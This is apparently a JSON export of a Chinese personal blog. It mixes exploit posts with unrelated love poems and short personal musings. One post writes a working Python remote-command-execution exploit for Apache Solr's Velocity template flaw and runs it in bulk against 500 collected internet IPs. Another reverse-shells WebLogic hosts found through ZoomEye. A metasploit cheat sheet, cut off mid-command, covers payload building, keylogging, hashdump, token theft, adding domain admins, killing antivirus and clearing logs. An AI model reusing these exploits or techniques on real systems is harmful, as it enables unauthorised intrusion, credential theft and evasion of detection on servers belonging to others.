[{"title":"Solr Velocity rce","url":"/2020/01/07/Solr-Velocity-rce/","content":"\n## Apache Solr Velocity模版注入远程命令执行漏洞复现以及POC编写\n\n作者：Whitesun\n\n#### 0x01 漏洞概述\n\n19年10月31日，安全研究员S00pY在GitHub发布了ApacheSolr Velocity模版注入远程命令执行的POC，经过其他安全团队和人员的验证和复现，此漏洞已经能够被批量利用。\n\n![](\\img\\1578276051044.png)\n\n<https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/>\n\n该漏洞的产生原因：Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中，params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。\n\n当params.resource.loader.enabled设置为true，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个恶意的POST请求，将params.resource.loader.enabled的值修改为true，在服务器上进行命令执行,从而获取服务器的权限。如果在赔上solr未授权访问漏洞，存在于外网的大部分solr服务器将不堪一击！\n\n关于params.resource.loader.enabled的介绍:\n\n<https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html>\n\n#### 0x02 影响范围\n\nsolr 4.x~solr 8.2 版本\n\n<!--more-->\n\n#### 0x03 本地复现\n\n通过清华大学镜像站下载个7.7版本的solr\n\n![1578276338655](\\img\\1578276338655.png)\n\n<https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/7.7.2/>\n\n安装到kail，因为在kail上可以不用再去配置Java环境。（使用docker也可以）\n\n我直接解压到桌面然后启动起来，启动记得加上 -force ，不然会提示你存在安全风险。\n\ncd solr-7.7.2/\n\n./bin/solr start -force\n\n![1578276560216](\\img\\1578276560216.png)\n\n可以看到solr服务已经启动起来，默认端口为8983。接下来我们使用浏览器访问solr，此时没做任何配置是存在solr未授权访问的，所以只在浏览器新建一个core。（可能会遇到无法添加core问题，将 /solr-7.7.0/server/solr/configsets/_default 下的 conf 文件夹复制到 new_core 文件夹下即可。）\n\n我这里已经添加成功了，现在就可以利用安全研究员S00pY所提供的的POC来验证即可。\n\n![1578277325466](\\img\\1578277325466.png)\n\n这个POC的思路是向某个core的config文件POST发送一个json格式的数据包，将 params.resource.loader.enabled 设置为 ture（默认为false）\n\n![1578278035752](\\img\\1578278035752.png)\n\n当返回包为200（某些低版本为500）时，就说明我们修改的配置已经生效可以进行命令执行。\n\n```json\n{\n \"update-queryresponsewriter\": {\n   \"startup\": \"lazy\",\n   \"name\": \"velocity\",\n   \"class\": \"solr.VelocityResponseWriter\",\n    \"template.base.dir\":\"\",\n   \"solr.resource.loader.enabled\": \"true\",\n   \"params.resource.loader.enabled\": \"true\"\n  }\n}\n```\n\n![1578278904477](\\img\\1578278904477.png)\n\n此时，在查看new_core的config的params.resource.loader.enabled 的值，已经为ture\n\n![1578278140818](\\img\\1578278140818.png)\n\n此时，利用给出的poc直接访问即可。\n\n`<http://192.168.153.131:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end>`\n\n![1578279117695](\\img\\1578279117695.png)\n\n相关分析：\n\n在现今的软件开发过程中，软件开发人员将更多的精力投入在了重复的相似劳动中。特别是在如今特别流行的 MVC 架构模式中，软件各个层次的功能更加独立，同时代码的相似度也更加高。所以我们需要寻找一种来减少软件开发人员重复劳动的方法，让程序员将更多的精力放在业务逻辑以及其他更加具有创造力的工作上。Velocity 这个模板引擎就可以在一定程度上解决这个问题。\n\nVelocity 是一个基于 Java 的模板引擎框架，提供的模板语言可以使用在 Java 中定义的对象和变量上。Velocity 是 Apache 基金会的项目，开发的目标是分离 MVC 模式中的持久化层和业务层。但是在实际应用过程中，Velocity 不仅仅被用在了 MVC 的架构中，还可以被用在以下一些场景中。\n\n1. Web 应用：开发者在不使用 JSP 的情况下，可以用 Velocity 让 HTML 具有动态内容的特性。\n2. 源代码生成：Velocity 可以被用来生成 Java 代码、SQL 或者 PostScript。有很多开源和商业开发的软件是使用 Velocity 来开发的。\n3. 自动 Email：很多软件的用户注册、密码提醒或者报表都是使用 Velocity 来自动生成的。使用 Velocity 可以在文本文件里面生成邮件内容，而不是在 Java 代码中拼接字符串。\n4. 转换 xml：Velocity 提供一个叫 Anakia 的 ant 任务，可以读取 XML 文件并让它能够被 Velocity 模板读取。一个比较普遍的应用是将 xdoc 文档转换成带样式的 HTML 文件。\n\n它允许任何人仅仅使用简单的模板语言（template language）来引用由java代码定义的对象。Velocity可以获取在java语言中定义的对象，从而实现界面和java代码的真正分离，这意味着可以使用Velocity替代jsp的开发模式了\n\n当Velocity应用于Web开发时，界面设计人员可以和java程序开发人员同步开发一个遵循MVC架构的web站点，也就是说，页面设计人员可以只关注页面的显示效果，而由java程序开发人员关注业务逻辑编码。Velocity将java代码从web页面中分离出来，这样为web站点的长期维护提供了便利，同时也为我们在JSP和PHP之外又提供了一种可选的方案。\n\n针对这个漏洞，大概来说的话，因为Velocity模板语言可以使用在 Java 中定义的对象和变量上。这个payload的核心就是构造了一个自定义的Velocity模板，来通过Java的Runtime.getRuntime().exec()来执行命令\n\n```python\np = \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec('id'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\"\n```\n\n\n\n对这个一些payload的参数进行解释。\n\n- 参数wt - 输出结果格式，通常为json/xml等格式，如果设置值为velocity，则会通过velocity引擎解析（重点）\n- 参数v.template - 模版名称，payload设置模版名称为custom\n- 参数v.template.custom - 自定义模板custom 的具体内容。也就是我们通过这个自定义的模板来执行命令。\n\n现在相信大家对于这个payload就有比较清晰的理解了，无奈本人对于Java也只处于了解一点的程度。更加深层次的分析参考seebug和先知社区。\n\n<https://paper.seebug.org/1107/>\n\n<https://xz.aliyun.com/t/6700>\n\n#### 0x04 修补方法\n\n修补方法：升级到最新的solr8.4版本\n\n#### 0x05 POC编写\n\n知道这个漏洞的实现原理后POC的编写就很简单了，利用python2.7编写。用到了sys、request、json模块。这里最后把输入的命令进行下URL编码。也就是POC中的CMD。\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport json\nimport sys\nfrom urllib import quote_plus\n\n\ndef main(url, cmd):\n# def main(url):\n    core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'\n\n    r = requests.get(url=core_selector_url)\n    json_strs = json.loads(r.text)\n    if r.status_code == 200 and \"responseHeader\" in r.text:\n        list = []\n        for core_selector in json_strs['status']:\n            list.append(json_strs['status']['%s' % core_selector]['name'])\n        jas502n_Core_Name = list[0]\n\n    newurl = url + '/solr/' + jas502n_Core_Name + '/config'\n    modifyConfig_headers = {\"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\",\n                            \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36\",\n                            \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\",\n                            \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\",\n                            \"Content-Type\": \"application/json\"}\n\n    modifyConfig_json = {\n        \"update-queryresponsewriter\": {\"startup\": \"lazy\", \"name\": \"velocity\",\n                                       \"class\": \"solr.VelocityResponseWriter\",\n                                       \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\",\n                                       \"params.resource.loader.enabled\": \"true\"}}\n    #data=json.dumps(payload)\n    res = requests.post(newurl, headers=modifyConfig_headers,json=modifyConfig_json)\n    cmd = quote_plus(cmd)\n    if res.status_code == 200 or 500:\n        try:\n            p = \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec('{}'))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\".format(\n                cmd)\n            target = url + '/solr/' + jas502n_Core_Name + p\n            print u'命令执行url：'\n            print target\n            result = requests.get(url=target)\n            if result.status_code == 200 and len(result.text) < 65:\n                print u'命令执行结果：'\n                print result.content\n        except Exception as e:\n            print\n            'failed'\n\n\nif __name__ == '__main__':\n    print\n    main(sys.argv[1], sys.argv[2])\n```\n\n\n\nPOC使用时直接加上url就行，但是url最后不要有斜杠。\n\n![1578279445556](\\img\\1578279445556.png)\n\n#### 0x06 批量验证\n\n采用Xyntax大佬的渗透测试插件化并发框架 POC-T\n\n<https://github.com/Xyntax/POC-T>\n\n![1578280225613](C:/Users/Administrator/Desktop/%E6%B8%97%E9%80%8F%E6%96%87%E7%AB%A0/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BB%A5%E5%8F%8APOC%E7%BC%96%E5%86%99/1578280225613.png)\n\n![1578280236707](\\img\\1578280236707.png)\n\n这个框架实现漏洞验证非常简便而对于POC的编写也很友好。\n\n![1578279815956](\\img\\1578279815956.png)\n\n将我们的代码稍微改进一下。\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport re\nimport sys\nimport json\n\ndef poc(url):\n    if '://' not in url:\n        url = 'http://' + url\n    try:\n        core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'\n\n        r = requests.get(url=core_selector_url)\n        json_strs = json.loads(r.text)\n        if r.status_code == 200 and \"responseHeader\" in r.text:\n            list = []\n            for core_selector in json_strs['status']:\n                list.append(json_strs['status']['%s' % core_selector]['name'])\n            jas502n_Core_Name = list[0]\n\n        debug_model_url = url + '/solr/' + jas502n_Core_Name + '/config'\n        modifyConfig_headers = {\"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\",\n                                \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3875.120 Safari/537.36\",\n                                \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\",\n                                \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\",\n                                \"Content-Type\": \"application/json\"}\n\n        modifyConfig_json = {\n            \"update-queryresponsewriter\": {\"startup\": \"lazy\", \"name\": \"velocity\",\n                                               \"class\": \"solr.VelocityResponseWriter\",\n                                               \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\",\n                                               \"params.resource.loader.enabled\": \"true\"}}\n\n        r3 = requests.post(debug_model_url, headers=modifyConfig_headers,json=modifyConfig_json)\n        if r3.status_code == 200 or 500:\n\n                p = \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\"\n                target = url + '/solr/' + jas502n_Core_Name + p\n                result = requests.get(url=target)\n                if result.status_code == 200 and len(result.text) < 65:\n                    return url\n    except Exception :\n        pass\n```\n\n```python\n\n```\n\n然后将收集到的url进行批量验证\n\npython2 POC-T.py -eT -t 50 -s solr_new_poc.py -iF C:\\Users\\Administrator\\Desktop\\txt\\solrtest.txt\n\n500个ip找到了18个存在漏洞的solr\n\n![1578280695409](\\img\\1578280695409.png)\n\n更对关于POC-T的使用请移步GitHub（虽然作者很久没更新了哈哈哈，但是还是很好用的）\n\n\n\n#### 0x07 参考\n\n<https://www.freebuf.com/column/218801.html>\n\n<https://cloud.tencent.com/developer/article/1532753>\n\n<https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/>\n\n<https://github.com/theLSA/solr-rce>\n\n<https://github.com/Xyntax/POC-T>","tags":["Solr"],"categories":["渗透测试"]},{"title":"WebLogic wls9-async反序列化远程命令执行漏洞复现","url":"/2019/09/03/WebLogic-wls9-async反序列化远程命令执行漏洞复现/","content":"\n## WebLogic wls9-async反序列化远程命令执行漏洞复现(CNVD-C-2019-48814)\n\n该漏洞是由wls9_async_response组件导致，在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，未授权的情况下远程执行命令。部分版本WebLogic中默认包含的wls9_async_response包，主要是为WebLogic Server提供异步通讯服务。\n\n<br>\n\n利用zoomeye扫描到的ip\n\n<br>\n\n首先访问 目标ip/_async/AsyncResponseService 来判断是否启用该组件，如果存在则有可能存在此漏洞。\n\n![](\\img\\weblogic1.png)\n\n漏洞原理是向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml\n\n利用poc\n\n<https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py>\n\n首先用ncat监听端口8888\n\n![](\\img\\weblogic2.png)\n\n然后利用ngrok进行内网穿透。下面这片文章写的非常好！\n\n<https://bbs.ichunqiu.com/thread-53000-1-1.html>\n\n![](\\img\\weblogic3.png)\n\n最后利用poc尝试反弹端口getshell\n\npython2 CNVD-C-2019-48814.py -l <ngrok分配的免费域名> -p <ngrok分配的端口> -r <目标ip+端口>\n\n漏洞利用成功\n\n![](\\img\\weblogic4.png)\n\n![](\\img\\weblogic5.png)","tags":["weblogic RCE"],"categories":["渗透测试"]},{"title":"I LIKE YOU","url":"/2019/05/21/I-LIKE-YOU/","content":"\n我想我大概是喜欢你，像猫住在屋顶，数着一夜星晴，笙箫落起；我想我大概是喜欢你，似对镜的花影，照着金甲红衣，云霄燃泣。其实啊，我真的是喜欢你，唱着梦中的歌曲，追逐着烽火之中的萧萧旌旗；其实啊，我真的是喜欢你，看着雪落的无心，描绘着漫漫风雨里的黄沙风起。我是，真的喜欢你啊。","tags":["小童"],"categories":["LOVER"]},{"title":"五月六号杂句","url":"/2019/05/06/五月六号杂句/","content":"\n你的酒馆早已打烊，满心欢喜的我冻死在长街上。\n\n<br/>\n\n一两次心动也许是鬼迷心窍，一直就叫在劫难逃。\n\n<br/>\n\n怎么说，挺遗憾的。喜欢你像坐滑梯似的，一下就滑下去了结束了，我坐在最底层想了想还是觉得难以回去，至少懒得原路返回也懒得绕一圈重新开始，起身拍了拍一屁股灰尘，又晃晃悠悠笑着向人潮走去了。岁月也不算冗长，你我都善良，我见到你的时候，还是会笑的。\n\n<br/>\n\n想起老舍说的：这世上真话本就不多，一位女子的脸红胜过一大段对白。\n\n<br/>\n\n放不下的时候，多想想对方是怎么放下你的。\n\n<br/>\n\n要怎么描述我对你的感觉啊\n就像无意间吃到了柠檬的外皮又涩又苦\n它们的汁液洒在眼圈上让我流了特别多无辜的眼泪我以后再也不想吃了    可是\n这种奇妙的感觉一辈子也就能体验一次。\n\n<br/>\n\n比如我这种人就不适合恋爱\n\n因为爱会唤醒我的占有欲控制欲\n\n也会勾引出我的狭隘自私敏感\n而这每一种情绪都足以令我和我爱的人痛苦且越爱越严重。\n\n<br/>\n\n 武林外传里面有一集\n郭芙蓉不小心把辣椒当做先面奶来用了，结果整个脸都红肿起来，哭着说嫁不出去了，然后吕秀才对郭芙蓉说你嫁给我吧，我记得你漂亮的样子。 \n\n<br/>\n\n“你这个人， 从一开始就大理性。你把自己层层包裹起来拒人于千里之外，哪怕付出也是适可而止。为了避免所有的结束，你避免了所有的开始，但是我还是希望有个人。”“什么? ”\n“有个人可以看穿你怕受伤的心，坚定地站在你身边。你知道，听歌时发现没谁可想，空空落落的，也不是件好事”\n\n<br/>\n\n人太贪心了开始时只想多看你一眼\n渐渐变成想和你在一起 努力克制占有欲可是\n\n有时会想占有你  然后开始不满开始挑剔\n\n因为无法实现  所以开始暴躁焦虑和歇斯底里\n\n可是一开始  一开始我只是温柔的站在人群中期待你温柔的再看我一眼。\n\n<br/>","tags":["日常"],"categories":["故事短句"]},{"title":"让你难过的事情就不要再坚持了","url":"/2019/04/29/让你难过的事情就不要再坚持了/","content":"\n<br>\n\n你每天这样熬夜，有人心疼你吗。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n其实每个人都会累，只是伪装着保护自己，有时像患了忧郁症一样，会突然心情不好。偶尔也想患了自闭症似的，不想说话也不想动。别人问起，也不知道该怎么回答。不是假装沉默，只是无力诉说。或许每个人都有一个死角，自己走不出来，别人也闯不进去，我把最深沉的秘密放在哪里，你不懂我，我不怪你。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n蛇不知道自己有毒\n\n老鼠也不知道自己用的都是偷来的\n\n人更不知道自己有错\n\n你的好对别人来说就只是一颗糖\n\n吃了就没了\n\n--------------------------------------------------------------------------------\n\n<br>\n\n以后，只对两种人好，一种是对我好的人，一种是懂得我好的人。\n\n在这短暂的生命里，一个人的温暖是有限的啊，一点都不能浪费。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n生活已经很累了，希望别再碰到那些让我不开心的傻逼了。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n还是不熬夜了，梦里什么都会有。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n后来我才知道，那些真正要走的人，吝啬得连说再见都觉得浪费时间;\n\n而那些嚷着说“喂，我要走了”还一步三回头的人，\n只不过是想你说一句'留下来好吗。“\n\n突然明白，真正的道别是没有道别，真正的告别从来都是不辞而别。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n生活中有很多不如意，如果一不开心，就寄希望于”如果当初“，那你永远不会开心。\n\n--------------------------------------------------------------------------------\n\n<br>\n\n没有谁是因为一时冲动而离开你的\n\n那些难过无助又一次次忍耐的眼泪你都看不见\n\n就像堤坝下逐渐因侵蚀而拓宽的裂缝\n\n你看见的只是它崩溃的那个瞬间\n\n------","tags":["sad~"],"categories":["故事短句"]},{"title":"metasploit常用命令","url":"/2019/04/29/metasploit常用命令/","content":"\nmetasploit常用命令\nservice apache2 start\n\nservice postgresql start\n\nmsfconsole启动\n\n## 1.MSF终端命令\n\nshow exploit\n\n列出metasploit框架中的所有渗透攻击模块。\n\nshow payloads\n\n列出metasploit框架中的所有攻击载荷。\n\nshow auxiliary\n\n列出metasploit框架中的所有辅助攻击模块。\n\nsearch name\n\n查找metasploit框架中的所有渗透攻击和其他模块。\n\ninfo\n\n展示出制定渗透攻击或模块的相关信息。\n\nuse name \n\n装载一个渗透攻击或者模块。\n\nLHOST\n\n目标主机链接的IP地址。\n\nRHOST\n\n远程主机或者目标主机。\n\nset function \n\n设置特定的配置参数。\n\nsetg function \n\n以全局方式设置特定的配置参数。\n\nshow options\n\n列出某个渗透攻击或模块中所有的参数配置。\n\nshow targets\n\n列出渗透攻击所支持的目标平台。\n\nset target num\n\n指定你所知道的目标的操作系统以及补丁版本类型。\n\nset payload\n\n指定想要使用的攻击载荷。\n\nshow advanced \n\n列出所有高级配置选项。\n\nset autorunscript migrate -f.\n\n在渗透攻击完成后，将自动迁移到另一个进程。\n\ncheck 检测目标是否对选定渗透攻击存在相应安全漏洞\n\nexploit \n\n执行渗透攻击或模块来攻击目标。\n\nexploit -j\n\n在计划任务下进行渗透攻击（攻击将在后台进行）\n\nexploit -z\n\n渗透攻击成功后不与会话进行交互。\n\nexploit -e encoder \n\n制定使用的攻击载荷编码方式\n\nexploit -h \n\n列出exploit命令的帮助信息。\n\nsessions -l\n\n列出可用的交互会话（在处理多个shell时使用）\n\nsessions -l -v\n\n列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。\n\nsessions -s script\n\n在所有活跃的meterpreter会话中运行一个特定的meterpreter脚本。\n\nsessions -K \n\n杀死所有活跃的交互会话。\n\nsessions -c cmd\n\n在所有活跃的metaerpreter会话上执行一个命令。\n\nsessions -u sessionID \n\n升级一个普通的win32shell到meterpreter shell。\n\ndb_create name \n\n创建一个数据库驱动攻击所要使用的数据库。\n\ndb_nmap\n\n利用nmap并把所有扫描数据库存储到数据库中。\n\ndb_autopwn -h\n\n展示出db_autopwn命令的帮助信息。\n\ndb_autopwn -p -r -e \n\n对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。\n\ndb_destroy \n\n删除当前数据库。\n\ndb_destroy user:password@host:port/database\n\n使用高级选项来删除数据库。\n\n \n\n## 2.metapreter命令\n\nhelp\n\n打开帮助\n\nrun scriptname\n\n运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。\n\nsysinfo\n\n列出受控主机的系统信息。\n\nls \n\n列出目标主机的文件和文件夹信息。\n\nuse priv\n\n加载特权提升扩展模块，来扩展meterpreter库。\n\nps\n\n显示所有运行进程以及关联的用户账户。\n\nmigrate PID\n\n迁移到一个指定的进程ID\n\nuse incognito \n\n加载inconito功能（用来盗取目标主机的令牌或是假冒用户）\n\nlist_tokens -u\n\n列出目标主机用户组的可用令牌。\n\nimpersonate_token DOMAIN_NAME\\\\USERNAME\n\n假冒目标主机上的可用令牌。\n\nsteal_token\n\n盗窃给定进程的可用令牌并进行令牌假冒。\n\ndrop_token\n\n停止假冒当前的令牌。\n\ngetsystem\n\n通过各种攻击向量来提升到系统用户权限。\n\nshell\n\n以所有可用令牌来运行一个交互的shell。\n\nexecute -f cmd.exe -i\n\n执行cmd.exe命令并进行交互。\n\nexecute -f cmd.exe -i -t\n\n以所有可用令牌来执行cmd命令。\n\nexecute -f cmd.exe -i -H -t\n\n以所有可用令牌来执行cmd命令并隐藏该进程。\n\nrev2self \n\n回到控制目标主机的初始用户账户下。\n\nreg command\n\n在目标主机注册表中进行交互，创建，删除和查询等操作。\n\nsetdesktop number\n\n切换到另一个用户界面（该功能基于那些用户已登录）。\n\nscreenshot\n\n对目标主机的屏幕进行截图。\n\nupload file\n\n向目标主机上传文件。\n\ndownload file\n\n从目标主机下载文件。\n\nkeyscan_dump存储目标主机上或许的键盘记录。\n\ngetprivs\n\n尽可能多的获取目标主机上的特权。\n\nuietl enable keyboard/mouse\n\n接管目标主机的键盘和鼠标。\n\nbackground\n\n将你当前的meterpreter shell转为后台执行。\n\nhashdump\n\n导出目标主机中的口令哈希值。\n\nuse sniffer\n\n加载嗅探模块。\n\nsniffer_interfaces\n\n列出目标主机所有开放的网络接口。\n\nsniffer_dump interfaceID pcapname\n\n在目标主机上启动嗅探。\n\nsniffer_start interfaceID packet_buffer\n\n在目标主机上针对特定范围的数据包缓冲区启动嗅探。\n\nsniffer_stats interfaceID\n\n获取正在实施嗅探网络接口的统计数据\n\nsniffer_stop interfaceID\n\n停止嗅探。\n\nadd_user username password -h ip\n\n在远程目标主机上添加一个用户。\n\nadd_group_user “Domain Adimins”username -h ip\n\n将用户添加到目标主机的域管理员组中。\n\nclearev\n\n清除目标主机上的日志记录。\n\ntimestomp\n\n修改文件属性，例如修改文件的创建时间（反取证调差）。\n\nreboot\n\n重启目标主机。\n\n## 3.MSFpayload命令\n\nmsfpayload -h\n\nMSFpayload 的帮助信息。\n\nmsfpayload windows/meterpreter/bind_tcp O\n\n列出所有可用的攻击载荷。\n\nmsfpayload windows/metarpreter/bind_tcp O.\n\n列出所有windows/meterpreter/bind_tcp 下攻击载荷的配置项（任何攻击载荷都是可以配置的）。\n\nmsfpayload windows/metaerpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X>payload.exe\n\n创建一个metarpreter的reverse_tcp 攻击载荷回连到192.168.1.5的443端口，将其保存为名为payload.exe的windows可执行程序。\n\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R>payload.ray\n\n与上面生成同样的攻击载荷，到导成原始格式的文件，该文件将在后面的MSFencode中使用。\n\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 C>payload.c\n\n与上面生成同样的攻击载荷，但导出成C格式的shellcode。\n\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 J>payload.java\n\n导出成以%u编码方式的javaScript语言字符串。\n\n \n\n## 4.MSFencode命令\n\nmsfencode -h\n\n列出MSFencode的帮助信息。\n\nmsfencode -l\n\n列出所有可用的编码器。\n\nmsfencode -t（c，eif.exe，java，js_be，perl，raw，ruby，vba，vbs，loop-vbs，asp，war，macho）\n\n显示编码缓冲区的格式。\n\nmsfencode -i payload.raw -o encoded_payload,exe -e x86/shikata_ga_nai -c 5 -t exe\n\n使用 shikata_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。\n\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -e x86/_countdown -c 5 -t raw|msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe\n\n创建一个经过多种编码格式嵌套编码的攻击载荷。\n\nmsfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c\n\n创建一个纯字母 数字的shellcode，由ESI寄存器指向shellcode，以C语言格式输出。\n\n \n\n## 5.MSFcli命令。\n\nmsfcli | grep exploit\n\n仅列出渗透攻击模块。\n\nmsfcli | grep exploit/windows\n\n仅列出与Windows相关的渗透攻击模块。\n\nmsfcli exploit/windows/smb/msf08_067_netapi PYALOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E\n\n对172.16.32.142 发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。\n\n \n\n## 6.Metasploit高级忍术\n\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -k -o payload.exe -c x86/shikata_ga_nai -c 7 -t exe\n\n创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5 主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序payload.exe。\n\nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe\n\n创建一个反弹式的meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会再目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算机程序打开呈现在目标用户面前，同样，最后生成用.shikata_ga_nai 编码的攻击载荷程序payload.exe。\n\nmsfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -0 payload.exe -e x86/shikata_ga_nai -c 7 exe & & msfcli multi/bandler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E\n\n创建一个raw格式的bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出以payload.exe命名的windows可执行程序文件，同时启用多路监听方式进行执行。\n\n \n\n## 7.MSFvenom\n\n利用MSFvenom，一个集成套件，来创建和编码你的攻击载荷。\n\nmsfvenom --payload\n\nwindows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 > msf.exe\n\n[*] x86/shikata_ga_nai succeeded with size 317(iteration=1)\n\nroot://opt/framework3/msf3#\n\n \n\n这一行命令就可以创建一个攻击载荷并自动产生出可执行文件格式。\n\n \n\n8.Meterpreter后渗透攻击阶段命令。\n\n在Windows主机上使用metarpreter进行提权操作。\n\nmeterpreter>use priv\n\nmeterpreter>getsystem\n\n从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中。\n\n \n\nmeterpreter>ps\n\n \n\nmeterpreter>steal_token 1784\n\nmeterpreter>shell\n\nc:\\windows\\sysem32>user metasploit @password /ADD /DOMAIN\n\nc:\\windows\\sysem32>net group \"Domain Admins\" metasploit /ADD /DOMAIN\n\n \n\n从SAM数据库中导出密码的哈希值。\n\nmeterpreter>use  priv\n\nmeterpreter>getsystem\n\nmeterpreter>hashdump\n\n提示：在widonws 2008中，如果getsystem命令和hashdump命令抛出异常情况时，你需要迁移到一个以SYSTEM系统权限运行的进程中。\n\n自动迁移到一个独立进程。\n\nmeterpreter>run migrate\n\n \n\n通过meterpreter的killav脚步来杀死目标主机运行的杀毒软件进程。\n\nmeterpreter>run kallav\n\n针对一个特定的进程捕获目标主机上的键盘记录：\n\nmeterpreter>ps\n\nmeterpreter>migrate 1436\n\nmeterpreter>kayscan_start\n\nmeterpreter>kayscan_start\n\nmeterpreter>keyscan_dump\n\nmeterpreter>kayscan_stop\n\n使用匿名方式来假冒管理员：\n\nmeterpreter>use incognito\n\nmeterpreter>list_tokens -u\n\nmeterpreter>use priv\n\nmeterpreter>getsystem\n\nmeterpreter>list_tokens -u\n\nmeterpreter>impersonate_token 